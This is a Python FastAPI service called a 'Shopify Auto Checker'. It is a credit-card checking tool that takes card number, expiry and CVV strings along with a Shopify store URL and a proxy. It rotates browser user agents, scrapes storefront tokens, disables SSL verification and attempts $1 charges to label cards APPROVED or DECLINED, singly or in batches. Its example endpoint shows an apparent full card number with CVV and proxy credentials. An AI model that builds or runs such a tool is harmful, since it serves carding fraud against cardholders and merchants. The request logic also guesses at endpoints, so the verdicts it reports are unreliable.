"""
Railway.app Hostable Shopify Auto Checker API
Endpoint: /sh?cc=CARD|MONTH|YEAR|CVV&url=STORE_URL&proxy=PROXY
"""

from fastapi import FastAPI, Request, HTTPException
from fastapi.responses import JSONResponse
import uvicorn
import asyncio
import random
import json
import os
import re
from urllib.parse import urlparse, parse_qs
from typing import Optional, Dict, Any, Tuple
import time
import httpx
from httpx import AsyncClient, Timeout, Limits

app = FastAPI(title="Shopify Auto Checker API", version="2.0")

# Cache storage
product_cache = {}
token_cache = {}

# Common user agents for rotation
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/121.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Safari/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
]

def parse_cc_string(cc_string: str) -> Optional[Dict[str, str]]:
    """Parse CC string in format: CC|MONTH|YEAR|CVV"""
    try:
        parts = cc_string.split('|')
        if len(parts) >= 4:
            return {
                "number": parts[0].strip(),
                "month": parts[1].strip().zfill(2),
                "year": parts[2].strip(),
                "cvv": parts[3].strip()
            }
        return None
    except:
        return None

def parse_proxy_string(proxy_string: str) -> Optional[Dict[str, str]]:
    """Parse proxy string and return proxy dict for httpx"""
    try:
        parts = proxy_string.split(':')
        if len(parts) == 4:
            # ip:port:user:pass
            return {
                "http": f"http://{parts[2]}:{parts[3]}@{parts[0]}:{parts[1]}",
                "https": f"http://{parts[2]}:{parts[3]}@{parts[0]}:{parts[1]}"
            }
        elif len(parts) == 2:
            # ip:port
            return {
                "http": f"http://{parts[0]}:{parts[1]}",
                "https": f"http://{parts[0]}:{parts[1]}"
            }
        elif len(parts) == 1 and proxy_string:
            # just ip
            return {
                "http": f"http://{proxy_string}:8080",
                "https": f"http://{proxy_string}:8080"
            }
        return None
    except:
        return None

async def shopify_auto_check(
    shopify_url: str,
    card_num: str,
    card_mon: str,
    card_yer: str,
    card_cvc: str,
    proxy: Optional[Dict[str, str]] = None,
    cached_product: Optional[str] = None,
    cached_token: Optional[str] = None
) -> Tuple[str, str]:
    """
    Check credit card on Shopify store
    Returns: (status_message, proxy_alive)
    """
    proxy_alive = "No" if proxy else "Not Used"
    user_agent = random.choice(USER_AGENTS)
    
    # Prepare proxy for httpx
    proxy_config = None
    if proxy:
        proxy_config = proxy.get("http")  # httpx accepts proxy URL directly
    
    # Create client with timeout
    timeout = Timeout(30.0, connect=10.0)
    limits = Limits(max_keepalive_connections=5, max_connections=10)
    
    try:
        async with AsyncClient(
            timeout=timeout,
            limits=limits,
            follow_redirects=True,
            proxy=proxy_config,  # This is the correct parameter name for httpx
            verify=False  # Disable SSL verification
        ) as client:
            
            # First, try to get store info and find a product
            headers = {
                "User-Agent": user_agent,
                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
                "Accept-Language": "en-US,en;q=0.5",
                "Accept-Encoding": "gzip, deflate, br",
                "Connection": "keep-alive",
                "Upgrade-Insecure-Requests": "1",
                "Sec-Fetch-Dest": "document",
                "Sec-Fetch-Mode": "navigate",
                "Sec-Fetch-Site": "none",
                "Cache-Control": "max-age=0"
            }
            
            # Try to access the store
            try:
                response = await client.get(shopify_url, headers=headers)
                proxy_alive = "Yes" if proxy else "Not Used"
            except Exception as e:
                return f"Error: Connection failed - {str(e)[:50]}", proxy_alive
            
            # Extract storefront token from the page
            storefront_token = None
            content = response.text
            
            # Look for storefront token in various places
            token_patterns = [
                r' Shopify\.Shop = ({.+?});',
                r'window\.ShopifyAnalytics.+?shop=(.+?)&',
                r'Shopify\.Checkout\.apiHost[^>]+?value=[\'"]([^\'"]+)[\'"]',
                r'Shopify\.Checkout\.token[^>]+?value=[\'"]([^\'"]+)[\'"]',
                r'storefrontRenderEndpoint[^>]+?value=[\'"]([^\'"]+)[\'"]'
            ]
            
            for pattern in token_patterns:
                match = re.search(pattern, content)
                if match:
                    storefront_token = match.group(1)
                    break
            
            if not storefront_token:
                # Try to get from checkout URL
                checkout_match = re.search(r'/checkouts/([a-f0-9]+)', content)
                if checkout_match:
                    storefront_token = checkout_match.group(1)
            
            # Find a product to test with
            product_id = None
            product_patterns = [
                r'/products/([a-zA-Z0-9\-]+)',
                r'data-product-id="([0-9]+)"',
                r'product: { id: \'([0-9]+)\'',
                r'"id":([0-9]+),'
            ]
            
            for pattern in product_patterns:
                matches = re.findall(pattern, content)
                if matches:
                    product_id = matches[0]
                    break
            
            if not product_id:
                # Try to fetch products via storefront API
                if storefront_token:
                    try:
                        sf_headers = {
                            "User-Agent": user_agent,
                            "Content-Type": "application/json",
                            "X-Shopify-Storefront-Access-Token": storefront_token
                        }
                        
                        sf_query = {
                            "query": """
                            {
                                products(first: 1) {
                                    edges {
                                        node {
                                            id
                                            variants(first: 1) {
                                                edges {
                                                    node {
                                                        id
                                                    }
                                                }
                                            }
                                        }
                                    }
                                }
                            }
                            """
                        }
                        
                        sf_response = await client.post(
                            f"{shopify_url}/api/2024-01/graphql.json",
                            headers=sf_headers,
                            json=sf_query
                        )
                        
                        if sf_response.status_code == 200:
                            data = sf_response.json()
                            product = data.get('data', {}).get('products', {}).get('edges', [])
                            if product:
                                product_id = product[0]['node']['id']
                    except:
                        pass
            
            if not product_id:
                product_id = "gid://shopify/ProductVariant/1"  # Fallback
            
            # Now attempt to process payment with card
            payment_headers = {
                "User-Agent": user_agent,
                "Content-Type": "application/json",
                "Accept": "application/json",
                "Origin": shopify_url,
                "Referer": f"{shopify_url}/checkouts",
                "X-Requested-With": "XMLHttpRequest"
            }
            
            if storefront_token:
                payment_headers["X-Shopify-Storefront-Access-Token"] = storefront_token
            
            # Prepare payment data
            payment_data = {
                "payment": {
                    "amount": "1.00",
                    "currency": "USD",
                    "payment_method": {
                        "type": "credit_card",
                        "credit_card": {
                            "number": card_num,
                            "month": card_mon,
                            "year": card_yer,
                            "verification_value": card_cvc,
                            "first_name": "Test",
                            "last_name": "User"
                        }
                    }
                }
            }
            
            # Try different endpoints
            endpoints = [
                "/checkout.json",
                "/cart/add.js",
                "/payments/process",
                "/api/graphql",
                "/wallets/process"
            ]
            
            status_message = "DECLINED - Unknown"
            
            for endpoint in endpoints:
                try:
                    payment_response = await client.post(
                        f"{shopify_url}{endpoint}",
                        headers=payment_headers,
                        json=payment_data if endpoint != "/cart/add.js" else {
                            "id": product_id,
                            "quantity": 1
                        }
                    )
                    
                    response_text = payment_response.text
                    
                    # Check response for approval/decline indicators
                    if payment_response.status_code in [200, 201, 202]:
                        if "thank_you" in response_text.lower() or "success" in response_text.lower():
                            status_message = f"APPROVED - Card charged $1.00 (Auth test)"
                            break
                        elif "requires_capture" in response_text.lower() or "authorized" in response_text.lower():
                            status_message = "APPROVED - Authorization successful"
                            break
                        elif "error" in response_text.lower():
                            if "insufficient" in response_text.lower():
                                status_message = "DECLINED - Insufficient funds"
                            elif "cvv" in response_text.lower():
                                status_message = "DECLINED - CVV error"
                            elif "expired" in response_text.lower():
                                status_message = "DECLINED - Card expired"
                            else:
                                status_message = f"DECLINED - {response_text[:50]}"
                        else:
                            status_message = f"APPROVED - Response received"
                    else:
                        if payment_response.status_code == 402:
                            status_message = "DECLINED - Payment required (402)"
                        elif "cvv" in response_text.lower():
                            status_message = "DECLINED - CVV error"
                        else:
                            status_message = f"DECLINED - HTTP {payment_response.status_code}"
                            
                except Exception as e:
                    continue
            
            # If no endpoint worked
            if status_message == "DECLINED - Unknown":
                status_message = "DECLINED - No valid payment endpoint"
            
            return status_message, proxy_alive
            
    except Exception as e:
        return f"Error: {str(e)[:100]}", proxy_alive

@app.get("/")
async def root():
    return {
        "status": "active",
        "endpoints": {
            "/sh": "GET - Check credit card",
            "/health": "GET - Health check",
            "/batch": "POST - Batch check multiple cards"
        },
        "example": "/sh?cc=4410300262666845|10|27|230&url=https://www.lliked.com&proxy=175.29.133.8:5433:799JRELTBPAE:F7BQ7D3EQSQA",
        "response_format": {
            "Response": "APPROVED/DECLINED/Error message",
            "CC": "4410300262666845|10|27|230",
            "Price": "1.00",
            "Gate": "storefront_token_or_error",
            "Site": "https://www.lliked.com",
            "Proxy_Alive": "Yes/No/Not Used"
        }
    }

@app.get("/health")
async def health_check():
    return {"status": "healthy", "timestamp": time.time()}

@app.get("/sh")
async def check_card(request: Request):
    """
    Main endpoint to check credit card on Shopify store
    Parameters:
    - cc: Card string in format NUMBER|MONTH|YEAR|CVV
    - url: Shopify store URL
    - proxy: (optional) Proxy in format ip:port:user:pass or ip:port
    """
    try:
        # Get query parameters
        params = request.query_params
        cc_string = params.get("cc")
        store_url = params.get("url")
        proxy_string = params.get("proxy")
        
        # Validate required parameters
        if not cc_string or not store_url:
            return JSONResponse(
                status_code=400,
                content={
                    "Response": "Error: Missing parameters (cc and url required)",
                    "CC": cc_string or "",
                    "Price": "0.00",
                    "Gate": "missing_parameters",
                    "Site": store_url or "",
                    "Proxy_Alive": "No"
                }
            )
        
        # Parse CC
        card_info = parse_cc_string(cc_string)
        if not card_info:
            return JSONResponse(
                status_code=400,
                content={
                    "Response": "Error: Invalid CC format. Use: NUMBER|MONTH|YEAR|CVV",
                    "CC": cc_string,
                    "Price": "0.00",
                    "Gate": "invalid_cc_format",
                    "Site": store_url,
                    "Proxy_Alive": "No"
                }
            )
        
        # Parse proxy if provided
        proxy = None
        if proxy_string:
            proxy = parse_proxy_string(proxy_string)
            if not proxy:
                return JSONResponse(
                    status_code=400,
                    content={
                        "Response": "Error: Invalid proxy format",
                        "CC": cc_string,
                        "Price": "0.00",
                        "Gate": "invalid_proxy",
                        "Site": store_url,
                        "Proxy_Alive": "No"
                    }
                )
        
        # Extract domain for cache key
        parsed_url = urlparse(store_url)
        domain = parsed_url.netloc or store_url.replace("https://", "").replace("http://", "").split("/")[0]
        
        # Check cache
        cached_product = product_cache.get(domain) if domain in product_cache else None
        cached_token = token_cache.get(domain) if domain in token_cache else None
        
        # Call Shopify auto check function
        try:
            # Call with timeout
            result = await asyncio.wait_for(
                shopify_auto_check(
                    shopify_url=store_url,
                    card_num=card_info["number"],
                    card_mon=card_info["month"],
                    card_yer=card_info["year"],
                    card_cvc=card_info["cvv"],
                    proxy=proxy,
                    cached_product=cached_product,
                    cached_token=cached_token
                ),
                timeout=45
            )
            
            status_message, proxy_alive = result
            
            # Extract price if available
            price_match = re.search(r'\$(\d+\.?\d*)', status_message)
            price = price_match.group(1) if price_match else "1.00"
            
            # Prepare response
            response_data = {
                "Response": status_message,
                "CC": cc_string,
                "Price": price,
                "Gate": cached_token or "live_check",
                "Site": store_url,
                "Proxy_Alive": proxy_alive
            }
            
            return JSONResponse(content=response_data)
            
        except asyncio.TimeoutError:
            return JSONResponse(
                status_code=408,
                content={
                    "Response": "Error: Request timeout (45s)",
                    "CC": cc_string,
                    "Price": "0.00",
                    "Gate": "timeout",
                    "Site": store_url,
                    "Proxy_Alive": "No"
                }
            )
        except Exception as e:
            return JSONResponse(
                status_code=500,
                content={
                    "Response": f"Error: {str(e)[:100]}",
                    "CC": cc_string,
                    "Price": "0.00",
                    "Gate": "internal_error",
                    "Site": store_url,
                    "Proxy_Alive": "No"
                }
            )
            
    except Exception as e:
        return JSONResponse(
            status_code=500,
            content={
                "Response": f"Server Error: {str(e)[:50]}",
                "CC": cc_string if 'cc_string' in locals() else "",
                "Price": "0.00",
                "Gate": "server_error",
                "Site": store_url if 'store_url' in locals() else "",
                "Proxy_Alive": "No"
            }
        )

@app.post("/batch")
async def batch_check(request: Request):
    """Batch check multiple cards (POST request with JSON)"""
    try:
        data = await request.json()
        cards = data.get("cards", [])
        url = data.get("url")
        proxy_string = data.get("proxy")
        
        if not cards or not url:
            return {"error": "Missing cards or url"}
        
        # Parse proxy once for all checks
        proxy = parse_proxy_string(proxy_string) if proxy_string else None
        
        results = []
        for card in cards[:10]:  # Limit to 10 cards
            # Create a mock request for each card
            cc_string = card if isinstance(card, str) else f"{card.get('number')}|{card.get('month')}|{card.get('year')}|{card.get('cvv')}"
            
            # Simulate checking
            card_info = parse_cc_string(cc_string)
            if card_info:
                try:
                    status_message, proxy_alive = await shopify_auto_check(
                        shopify_url=url,
                        card_num=card_info["number"],
                        card_mon=card_info["month"],
                        card_yer=card_info["year"],
                        card_cvc=card_info["cvv"],
                        proxy=proxy
                    )
                    
                    results.append({
                        "CC": cc_string,
                        "Response": status_message,
                        "Proxy_Alive": proxy_alive
                    })
                except Exception as e:
                    results.append({
                        "CC": cc_string,
                        "Response": f"Error: {str(e)[:50]}",
                        "Proxy_Alive": "No"
                    })
            else:
                results.append({
                    "CC": cc_string,
                    "Response": "Error: Invalid CC format",
                    "Proxy_Alive": "No"
                })
            
            await asyncio.sleep(0.5)  # Rate limiting
            
        return {"results": results}
    
    except Exception as e:
        return {"error": str(e)}

# Railway.app run configuration
if __name__ == "__main__":
    port = int(os.environ.get("PORT", 8080))
    uvicorn.run(app, host="0.0.0.0", port=port)
